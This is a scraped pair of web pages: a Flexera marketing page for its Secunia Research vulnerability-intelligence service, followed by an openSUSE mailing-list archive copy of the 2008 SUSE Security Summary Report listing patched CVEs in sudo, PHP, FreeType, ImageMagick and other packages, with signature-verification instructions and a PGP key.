* [Security advisories from Secunia Research](https://www.flexera.com/products/security/software-vulnerability-advisories)
* [Report a vulnerability](https://www.flexera.com/about-us/contact-us/report-vulnerability)

 ![Secunia Research](/sites/default/files/2022-04/hero-secunia-research-bg.jpg)

Featured Details

## Multiple ways to consume Secunia Research

Secunia delivers software security research that provides reliable, curated and actionable vulnerability intelligence. Organizations can expect to receive standardized, validated and enriched vulnerability research on a specific version of a software product. Secunia Research supports four solutions:

![Software Vulnerability Research](/sites/default/files/2022-04/icon-secunia-research-svr.svg)

### [Software Vulnerability Research](https://www.flexera.com/products/software-vulnerability-research)

Software Vulnerability Research utilizes Secunia Research to drive awareness of vulnerabilities matching your specified criteria

[Learn More](https://www.flexera.com/products/software-vulnerability-research)

![Software Vulnerability Manager](/sites/default/files/2022-04/icon-secunia-research-svm.svg)

### [Software Vulnerability Manager](/products/software-vulnerability-manager)

Software Vulnerability Manager uses Secunia Research data to identify, prioritize and patch known vulnerable software detected in your environment

[Learn More](/products/software-vulnerability-manager)

![Data Platform](/sites/default/files/2022-04/icon-secunia-research-dp.svg)

### [Data Platform](https://www.flexera.com/products/data-platform)

Data Platform leverages Secunia Research to provide high-level insights based on major or minor versions of software in your normalized inventory

[Learn More](https://www.flexera.com/products/data-platform)

![Flexera One](/sites/default/files/2022-04/icon-secunia-research-flexera-one.svg)

### [Flexera One](/flexera-one)

Flexera One utilizes Secunia Research (alongside public NVD data) to provide more granular matching of build-level versions of software in your normalized inventory within its IT Asset Management and IT Visibility solutions

[Learn More](/flexera-one)

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

Informing IT, Transforming IT

## Industry insights to help keep you informed

[#### Webinar

### Stay Ahead of Cyber Threats: Flexera's Latest Vulnerability Insights

Join us for this session where we'll explore the latest findings from the Flexera Monthly Vulnerability Insights Report.](https://info.flexera.com/SVM-WBNR-Vulnerability-Insights-Roundtable)

[#### Webinar

### Dive deeper into the Flexera Annual Vulnerability Insights

We'll explore the key findings from the Flexera Annual Vulnerability Insights Report. Learn about the latest cybersecurity trends, the most targeted industries, the types of vulnerabilities, plus management and mitigation strategies.](https://info.flexera.com/SVM-WBNR-Flexera-Annual-Vulnerability-Insights?lead_source=Website%20Visitor&id=Flexera.com-Resources)

#### Video

### Close the Risk Window with Software Vulnerability Manager

Stop reacting. Gain control. Stay secure. Build a more effective risk mitigation process leveraging Secunia Research vulnerability intelligence and the largest repository of third-party patch data in the industry.

Remote video URL

[#### Trial

### Software Vulnerability Manager Assessment free trial

Get access to the complete set of modules of Software Vulnerability Manager: Research, Assessment and Patching](https://info.flexera.com/SVM-EVAL-Software-Vulnerability-Manager)

[#### Datasheet

### Protect your ServiceNow® investment with the highest quality data

IT Visibility offers certified ServiceNow integrations that accelerate platform expansion, improve ROI and increase efficiencies across ITIL processes by delivering clean software and hardware asset data directly.](/sites/default/files/datasheet-itv-maximize-servicenow-investment.pdf)

[#### Blog

### Avoid missing crucial vulnerability intelligence amid NVD backlog

Recent developments regarding the National Vulnerability Database (NVD) have some technology leaders on edge. Since February, the U.S. National Institute of Standards and Technology (NIST) has almost completely stopped enriching software vulnerabi...](https://www.flexera.com/blog/vulnerability-management/avoid-missing-crucial-vulnerability-intelligence-amid-nvd-backlog/)

[View all resources](https://www.flexera.com/resources?category%5Bsoftware-vulnerability-management%5D=software-vulnerability-management)

## Footer Menu

* Column
  + Business challenge
    - [Software renewals and audits](https://www.flexera.com/solutions/software-renewals-audits)
    - [Software license management and optimization](https://www.flexera.com/solutions/software-usage-costs)
    - [SaaS spend management](https://www.flexera.com/solutions/saas-spend)
    - [Cloud cost management](https://www.flexera.com/solutions/cloud-cost)
    - [IT asset lifecycle management](https://www.flexera.com/solutions/it-asset-lifecycle)
    - [CMDB data quality](https://www.flexera.com/solutions/cmdb-data-quality)
    - [Accurate IT inventory](https://www.flexera.com/solutions/it-inventory)
    - [Security and regulatory risk management](https://www.flexera.com/solutions/it-security-regulatory-risk)
    - [Sustainable IT](https://www.flexera.com/solutions/sustainable-it)
    - [AI-powered transformation](https://www.flexera.com/solutions/ai-powered-transformation)
    - [Public sector](https://www.flexera.com/solutions/public-sector)
* Column
  + Spend management by vendor
    - [IBM](https://www.flexera.com/solutions/vendor/ibm)
    - [Oracle](https://www.flexera.com/solutions/vendor/oracle)
    - [Microsoft](https://www.flexera.com/solutions/vendor/microsoft)
    - [SAP](https://www.flexera.com/solutions/vendor/sap)
    - [VMware](https://www.flexera.com/solutions/vendor/vmware)
    - [ServiceNow](https://www.flexera.com/solutions/vendor/servicenow)
    - [AWS](https://www.flexera.com/solutions/vendor/aws)
    - [Salesforce](https://www.flexera.com/solutions/vendor/salesforce)
    - [BMC](https://www.flexera.com/solutions/cmdb-data-quality/bmc)
    - [Adobe](https://www.flexera.com/solutions/vendor/adobe)
* Column
  + Products
    - [Flexera One](https://www.flexera.com/products/flexera-one)
    - [Snow Atlas](https://www.flexera.com/products/snow-atlas)
    - [Security](https://www.flexera.com/products/security)
    - [Application Readiness](https://www.flexera.com/products/adminstudio)
    - [All products](https://www.flexera.com/products)
    - [All Snow products](https://www.flexera.com/products/snow)
    - [Integrations](https://www.flexera.com/products/integrations)
* Column
  + Company
    - [About](https://www.flexera.com/about-us)
    - [Careers](https://www.flexera.com/about-us/careers)
    - [Leadership](https://www.flexera.com/about-us/leadership)
    - [Contact us](https://www.flexera.com/about-us/contact-us)
    - [Media / press center](https://www.flexera.com/about-us/press-center)
    - [Revenera.com](https://www.revenera.com)

 +1.800.374.4353

en

* [English](https://www.flexera.com/products/security/software-vulnerability-research/secunia-research?referrer=secunia)
* [Deutsch](https://www.flexera.de/products/security/software-vulnerability-research/secunia-research?referrer=secunia)

 [![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

© 2025 Flexera. All Rights Reserved.

## Footer

* [Privacy Policy](https://www.flexera.com/legal/privacy-policy)
* [Terms and conditions](https://www.flexera.com/legal)
* [Contact Us](https://www.flexera.com/about-us/contact-us)
* [Impressum](https://www.flexera.com/about-us/impressum)
* [Site Map](https://www.flexera.com/sitemap)

#####

×

...



=== Content from lists.opensuse.org_3e971ab0_20250125_104739.html ===


[![openSUSE](https://static.opensuse.org/favicon.svg)
Mailing Lists](/archives/ "openSUSE Mailing Lists")

[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/UKEEZOQBUGSSIL6IJ7JPSKKZ6KMBMRQV/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/UKEEZOQBUGSSIL6IJ7JPSKKZ6KMBMRQV/)

[Manage this list](/manage/lists/security-announce.lists.opensuse.org/)
[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/UKEEZOQBUGSSIL6IJ7JPSKKZ6KMBMRQV/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/UKEEZOQBUGSSIL6IJ7JPSKKZ6KMBMRQV/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

[thread](/archives/list/security-announce%40lists.opensuse.org/thread/UKEEZOQBUGSSIL6IJ7JPSKKZ6KMBMRQV/#UKEEZOQBUGSSIL6IJ7JPSKKZ6KMBMRQV)

# [security-announce] SUSE Security Summary Report SUSE-SR:2008:014

![](https://seccdn.libravatar.org/avatar/bff0c215e01f23fcee6fe49e65fae458.jpg?s=120&d=mm&r=g)
## [Marcus Meissner](/archives/users/7f6ceefc1eac47b3aa8bbc0c4e1230fe/ "See the profile for Marcus Meissner")

4 Jul
2008

4 Jul
'08

15:10

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
SUSE Security Summary Report
Announcement ID: SUSE-SR:2008:014
Date: Fri, 04 Jul 2008 15:00:00 +0000
Cross-References: CVE-2004-0918, CVE-2008-0887, CVE-2008-1096
CVE-2008-1097, CVE-2008-1384, CVE-2008-1806
CVE-2008-1807, CVE-2008-1808, CVE-2008-1947
CVE-2008-2050, CVE-2008-2051, CVE-2008-2107
CVE-2008-2357, CVE-2008-2371, CVE-2008-2667
CVE-2008-2713
Content of this advisory:
1) Solved Security Vulnerabilities:
- sudo not flushing stdin
- courier-authlib SQL injection possibility
- gnome-screensaver
- clamav 0.93.1
- php5 security update
- ImageMagick, GraphicsMagick security problems
- mtr potential remote overflow
- bind root zone update
- pcre buffer overflow
- tomcat55 and tomcat6 cross site scripting problem
- squid denial of service problem in ASN.1 parsing
- freetype2 various integer overflows
2) Pending Vulnerabilities, Solutions, and Work-Arounds:
None listed this week.
3) Authenticity Verification and Additional Information
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
1) Solved Security Vulnerabilities
To avoid flooding mailing lists with SUSE Security Announcements for minor
issues, SUSE Security releases weekly summary reports for the low profile
vulnerability fixes. The SUSE Security Summary Reports do not list or
download URLs like the SUSE Security Announcements that are released for
more severe vulnerabilities.
Fixed packages for the following incidents are already available on our FTP
server and via the YaST Online Update.
- sudo not flushing stdin
This update of sudo flushes the stdin buffer on password
timeout. Unflushed buffers can lead to leaking the password via a
parent process reading stdin after sudo exits.
This issue only affects openSUSE 10.3 and was fixed there.
- courier-authlib SQL injection possibility
courier-authlib was updated to fix a bug that allowed SQL
injections. (CVE-2008-2667)
Only openSUSE 10.3 and 11.0 were affected.
- gnome-screensaver
Using gnome-screensaver an attacker could log in without a valid
password if the NIS server is down. (CVE-2008-0887)
gnome-screensaver was affected on SUSE Linux Enterprise 10, SUSE
Linux 10.1, openSUSE 10.2 and 10.3 and was fixed there.
- clamav 0.93.1
Clamav was updated to version 0.93.1. It fixes various bugs and
one minor security issue:
CVE-2008-2713: libclamav/petite.c in ClamAV before 0.93.1 allows
remote attackers to cause a denial of service via a crafted Petite
file that triggers an out-of-bounds read.
clamav was updated on all products containing clamav.
- PHP 5 security update
php5 was updated to fix various bugs and security problems:
- possible stack-based buffer overflow CVE-2008-2050
- incomplete escapeshellcmd() CVE-2008-2051
- printf() integer overflow CVE-2008-1384
- insecure GENERATE\_SEED macro CVE-2008-2107
- timezone update for DST in Pakistan
On openSUSE 10.2 up to 11.0 php5 was updated to 5.2.6. For SUSE
Linux Enterprise 10 SP1 and SP2 the fixes were backported.
- ImageMagick, GraphicsMagick security problems
ImageMagick and GraphicsMagick were affected by two security problems:
CVE-2008-1096: Buffer overflow in the handling of XCF files
CVE-2008-1097: Heap buffer overflow in the handling of PCX files
ImageMagick was updated on all products. GraphicsMagick is only
found on openSUSE 10.3 and 11.0 and was updated there.
- mtr potential remote overflow
MTR was updated to fix a stack based buffer overflow which could
potentially be exploited by a remote attacker to execute arbitrary
code (CVE-2008-2357).
mtr was updated on all SUSE Linux based products.
- bind root zone update
The IP number for the "L" root DNS server changed.
This patch updates the root.hint zone file to get the new IP number.
This is only security related and not a true vulnerability since the
old server is still operating correctly.
- pcre buffer overflow
Specially crafted regular expressions could lead to a buffer overflow
in the pcre library. Applications using pcre to process regular
expressions from untrusted sources could therefore potentially be
exploited by attackers to execute arbitrary code (CVE-2008-2371).
Only the pcre version on openSUSE 10.3 was affected by this problem
and received fixed packages.
- tomcat55 and tomcat6 cross site scripting problem
tomcat was updated to fix a cross-site-scripting vulnerability in
the host-manager. (CVE-2008-1947)
Since the problem only affects tomcat 5.5 and tomcat 6 only those
were fixed in openSUSE 10.3 and 11.0. Other products were not
affected.
- squid denial of service problem in ASN.1 parsing
Squid was updated to fix an old denial-of-service bug that can
occur while parsing ASN.1 data. (CVE-2004-0918)
More details can be found on:
<http://www.squid-cache.org/Advisories/SQUID-2008_1.txt>
Only Squid 3.0 was affected, which is only on openSUSE 11.0 and
was fixed there.
- freetype2 various integer overflows
This update of freetype2 fixes several potential vulnerabilities
reported by iDefense.
CVE-2008-1806: Integer overflow in FreeType2 allows context-dependent
attackers to execute arbitrary code via a crafted set of 16-bit
length values within the Private dictionary table in a Printer Font
Binary (PFB) file, which triggers a heap-based buffer overflow.
CVE-2008-1807: FreeType2 allow context-dependent attackers to execute
arbitrary code via an invalid "number of axes" field in a Printer
Font Binary (PFB) file, which triggers a free of arbitrary memory
locations, leading to memory corruption.
CVE-2008-1808: Multiple off-by-one errors in FreeType2 before 2.3.6
allow context-dependent attackers to execute arbitrary code via
(1) a crafted table in a Printer Font Binary (PFB) file or (2)
a crafted SHC instruction in a TrueType Font (TTF) file, which
triggers a heap-based buffer overflow.
Freetype2 was updated on all distributions.
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
2) Pending Vulnerabilities, Solutions, and Work-Arounds
None listed this week.
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
3) Authenticity Verification and Additional Information
- Announcement authenticity verification:
SUSE security announcements are published via mailing lists and on Web
sites. The authenticity and integrity of a SUSE security announcement is
guaranteed by a cryptographic signature in each announcement. All SUSE
security announcements are published with a valid signature.
To verify the signature of the announcement, save it as text into a file
and run the command
gpg --verify <file>
replacing <file> with the name of the file containing the announcement.
The output for a valid signature looks like:
gpg: Signature made <DATE> using RSA key ID 3D25D3D9
gpg: Good signature from "SuSE Security Team <security@suse.de>"
where <DATE> is replaced by the date the document was signed.
If the security team's key is not contained in your key ring, you can
import it from the first installation CD. To import the key, use the
command
gpg --import gpg-pubkey-3d25d3d9-36e12d04.asc
- Package authenticity verification:
SUSE update packages are available on many mirror FTP servers all over the
world. While this service is considered valuable and important to the free
and open source software community, the authenticity and integrity of a
package needs to be verified to ensure that it has not been tampered with.
The internal RPM package signatures provide an easy way to verify the
authenticity of an RPM package. Use the command
rpm -v --checksig <file.rpm>
to verify the signature of the package, replacing <file.rpm> with the
filename of the RPM package downloaded. The package is unmodified if it
contains a valid signature from build@suse.de with the key ID 9C800ACA.
This key is automatically imported into the RPM database (on RPMv4-based
distributions) and the gpg key ring of 'root' during installation. You can
also find it on the first installation CD and included at the end of this
announcement.
- SUSE runs two security mailing lists to which any interested party may
subscribe:
opensuse-security@opensuse.org
- General Linux and SUSE security discussion.
All SUSE security announcements are sent to this list.
To subscribe, send an e-mail to
<opensuse-security+subscribe@opensuse.org>.
opensuse-security-announce@opensuse.org
- SUSE's announce-only mailing list.
Only SUSE's security announcements are sent to this list.
To subscribe, send an e-mail to
<opensuse-security-announce+subscribe@opensuse.org>.
=====================================================================
SUSE's security contact is <security@suse.com> or <security@suse.de>.
The <security@suse.de> public key is listed below.
=====================================================================
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
The information in this advisory may be distributed or reproduced,
provided that the advisory is not modified in any way. In particular, the
clear text signature should show proof of the authenticity of the text.
SUSE Linux Products GmbH provides no warranties of any kind whatsoever
with respect to the information contained in this security advisory.
Type Bits/KeyID Date User ID
pub 2048R/3D25D3D9 1999-03-06 SuSE Security Team <security@suse.de>
pub 1024D/9C800ACA 2000-10-19 SuSE Package Signing Key <build@suse.de>
- -----BEGIN PGP PUBLIC KEY BLOCK-----
Version: GnuPG v1.4.2 (GNU/Linux)
mQENAzbhLQQAAAEIAKAkXHe0lWRBXLpn38hMHy03F0I4Sszmoc8aaKJrhfhyMlOA
BqvklPLE2f9UrI4Xc860gH79ZREwAgPt0pi6+SleNFLNcNFAuuHMLQOOsaMFatbz
JR9i4m/lf6q929YROu5zB48rBAlcfTm+IBbijaEdnqpwGib45wE/Cfy6FAttBHQh
1Kp+r/jPbf1mYAvljUfHKuvbg8t2EIQz/5yGp+n5trn9pElfQO2cRBq8LFpf1l+U
P7EKjFmlOq+Gs/fF98/dP3DfniSd78LQPq5vp8RL8nr/o2i7jkAQ33m4f1wOBWd+
cZovrKXYlXiR+Bf7m2hpZo+/sAzhd7LmAD0l09kABRG0JVN1U0UgU2VjdXJpdHkg
VGVhbSA8c2VjdXJpdHlAc3VzZS5kZT6JARUDBRA24S1H5Fiyh7HKPEUBAVcOB/9b
yHYji1/+4Xc2GhvXK0FSJN0MGgeXgW47yxDL7gmR4mNgjlIOUHZj0PEpVjWepOJ7
tQS3L9oP6cpj1Fj/XxuLbkp5VCQ61hpt54coQAvYrnT9rtWEGN+xmwejT1WmYmDJ
xG+EGBXKr+XP69oIUl1E2JO3rXeklulgjqRKos4cdXKgyjWZ7CP9V9daRXDtje63
Om8gwSdU/nCvhdRIWp/Vwbf7Ia8iZr9OJ5YuQl0DBG4qmGDDrvImgPAFkYFzwlqo
choXFQ9y0YVCV41DnR+GYhwl2qBd81T8aXhihEGPIgaw3g8gd8B5o6mPVgl+nJqI
BkEYGBusiag2pS6qwznZiQEVAwUQNuEtBHey5gA9JdPZAQFtOAf+KVh939b0J94u
v/kpg4xs1LthlhquhbHcKNoVTNspugiC3qMPyvSX4XcBr2PC0cVkS4Z9PY9iCfT+
x9WM96g39dAF+le2CCx7XISk9XXJ4ApEy5g4AuK7NYgAJd39PPbERgWnxjxir9g0
Ix30dS30bW39D+3NPU5Ho9TD/B7UDFvYT5AWHl3MGwo3a1RhTs6sfgL7yQ3U+mvq
MkTExZb5mfN1FeaYKMopoI4VpzNVeGxQWIz67VjJHVyUlF20ekOz4kWVgsxkc8G2
saqZd6yv2EwqYTi8BDAduweP33KrQc4KDDommQNDOXxaKOeCoESIdM4p7Esdjq1o
L0oixF12CohGBBARAgAGBQI7HmHDAAoJEJ5A4xAACqukTlQAoI4QzP9yjPohY7OU
F7J3eKBTzp25AJ42BmtSd3pvm5ldmognWF3Trhp+GYkAlQMFEDe3O8IWkDf+zvyS
FQEBAfkD/3GG5UgJj18UhYmh1gfjIlDcPAeqMwSytEHDENmHC+vlZQ/p0mT9tPiW
tp34io54mwr+bLPN8l6B5GJNkbGvH6M+mO7R8Lj4nHL6pyAv3PQr83WyLHcaX7It
Klj371/4yzKV6qpz43SGRK4MacLo2rNZ/dNej7lwPCtzCcFYwqkiiEYEEBECAAYF
AjoaQqQACgkQx1KqMrDf94ArewCfWnTUDG5gNYkmHG4bYL8fQcizyA4An2eVo/n+
3J2KRWSOhpAMsnMxtPbBmQGiBDnu9IERBACT8Y35+2vv4MGVKiLEMOl9GdST6MCk
YS3yEKeueNWc+z/0Kvff4JctBsgs47tjmiI9sl0eHjm3gTR8rItXMN6sJEUHWzDP
+Y0PFPboMvKx0FXl/A0dM+HFrruCgBlWt6FA+okRySQiliuI5phwqkXefl9AhkwR
8xocQSVCFxcwvwCglVcOQliHu8jwRQHxlRE0tkwQQI0D+wfQwKdvhDplxHJ5nf7U
8c/yE/vdvpN6lF0tmFrKXBUX+K7u4ifrZlQvj/81M4INjtXreqDiJtr99Rs6xa0S
cZqITuZC4CWxJa9GynBED3+D2t1V/f8l0smsuYoFOF7Ib49IkTdbtwAThlZp8bEh
ELBeGaPdNCcmfZ66rKUdG5sRA/9ovnc1krSQF2+sqB9/o7w5/q2qiyzwOSTnkjtB
UVKn4zLUOf6aeBAoV6NMCC3Kj9aZHfA+ND0ehPaVGJgjaVNFhPi4x0e7BULdvgOo
AqajLfvkURHAeSsxXIoEmyW/xC1sBbDkDUIBSx5oej73XCZgnj/inphRqGpsb+1n
KFvF+rQoU3VTRSBQYWNrYWdlIFNpZ25pbmcgS2V5IDxidWlsZEBzdXNlLmRlPohi
BBMRAgAiBQJA2AY+AhsDBQkObd+9BAsHAwIDFQIDAxYCAQIeAQIXgAAKCRCoTtro
nIAKypCfAJ9RuZ6ZSV7QW4pTgTIxQ+ABPp0sIwCffG9bCNnrETPlgOn+dGEkAWeg
KL+IRgQQEQIABgUCOnBeUgAKCRCeQOMQAAqrpNzOAKCL512FZvv4VZx94TpbA9lx
yoAejACeOO1HIbActAevk5MUBhNeLZa/qM2JARUDBRA6cGBvd7LmAD0l09kBATWn
B/9An5vfiUUE1VQnt+T/EYklES3tXXaJJp9pHMa4fzFa8jPVtv5UBHGee3XoUNDV
wM2OgSEISZxbzdXGnqIlcT08TzBUD9i579uifklLsnr35SJDZ6ram51/CWOnnaVh
UzneOA9gTPSr+/fT3WeVnwJiQCQ30kNLWVXWATMnsnT486eAOlT6UNBPYQLpUprF
5Yryk23pQUPAgJENDEqeU6iIO9Ot1ZPtB0lniw+/xCi13D360o1tZDYOp0hHHJN3
D3EN8C1yPqZd5CvvznYvB6bWBIpWcRgdn2DUVMmpU661jwqGlRz1F84JG/xe4jGu
zgpJt9IXSzyohEJB6XG5+D0BuQINBDnu9JIQCACEkdBN6Mxf5WvqDWkcMRy6wnrd
9DYJ8UUTmIT2iQf07tRUKJJ9v0JXfx2Z4d08IQSMNRaq4VgSe+PdYgIy0fbj23Vi
a5/gO7fJEpD2hd2f+pMnOWvH2rOOIbeYfuhzAc6BQjAKtmgR0ERUTafTM9Wb6F13
CNZZNZfDqnFDP6L12w3z3F7FFXkz07Rs3AIto1ZfYZd4sCSpMr/0S5nLrHbIvGLp
271hhQBeRmmoGEKO2JRelGgUJ2CUzOdtwDIKT0LbCpvaP8PVnYF5IFoYJIWRHqlE
t5ucTXstZy7vYjL6vTP4l5xs+LIOkNmPhqmfsgLzVo0UaLt80hOwc4NvDCOLAAMG
B/9g+9V3ORzw4LvO1pwRYJqfDKUq/EJ0rNMMD4N8RLpZRhKHKJUm9nNHLbksnlZw
rbSTM5LpC/U6sheLP+l0bLVoq0lmsCcUSyh+mY6PxWirLIWCn/IAZAGnXb6Zd6Tt
IJlGG6pqUN8QxGJYQnonl0uTJKHJENbI9sWHQdcTtBMc34gorHFCo1Bcvpnc1LFL
rWn7mfoGx6INQjf3HGQpMXAWuSBQhzkazY6vaWFpa8bBJ+gKbBuySWzNm3rFtT5H
RKMWpO+M9bHp4d+puY0L1YwN1OMatcMMpcWnZpiWiR83oi32+xtWUY2U7Ae38mMa
g8zFbpeqPQUsDv9V7CAJ1dbriEwEGBECAAwFAkDYBnoFCQ5t3+gACgkQqE7a6JyA
CspnpgCfRbYwxT3iq+9l/PgNTUNTZOlof2oAn25y0eGi0371jap9kOV6uq71sUuO
=ypVs
- -----END PGP PUBLIC KEY BLOCK-----
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2.0.4-svn0 (GNU/Linux)
iQEVAwUBSG49U3ey5gA9JdPZAQIzdQf+KR6ORLVFbW6znZqemOjUy29mTF+iaqgu
LE4OSDzw3+TMeebNtukUwXEiqSjOqB4T88TlqUch9K1aCqrQlai1xyG3FZLQRHGQ
E9KU79ZnE6TswZ60FG6WDnrmojxLnkIS4QFfFdN9dqsUrqmPikx5zvmF3azNiD6B
aviALl/1AOfEJ7Wf9fArf/9bnCpK2sp289MNWnhzAgiDnRAp+3NbO9OkE3CmWWH6
iIuh65D5hzISUbrwr3JWM9MHjkBb5VjdaMa9XPb7VaBw5bN3XpHlXos0d3v3zUKa
s1dquQMiUJ3KQ1lgGO3Na0Ad7MVUzDRnjhL5It+qCuRd19jpc8bqgA==
=D3N5
-----END PGP SIGNATURE-----
--
To unsubscribe, e-mail: opensuse-security-announce+unsubscribe@opensuse.org
For additional commands, e-mail: opensuse-security-announce+help@opensuse.org

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Sign in to reply online](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/UKEEZOQBUGSSIL6IJ7JPSKKZ6KMBMRQV/)
Use email software

[Back to the thread](/archives/list/security-announce%40lists.opensuse.org/thread/UKEEZOQBUGSSIL6IJ7JPSKKZ6KMBMRQV/#UKEEZOQBUGSSIL6IJ7JPSKKZ6KMBMRQV)

[Back to the list](/archives/list/security-announce%40lists.opensuse.org/)

![HyperKitty](/static/hyperkitty/img/logo.png)
Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.12.


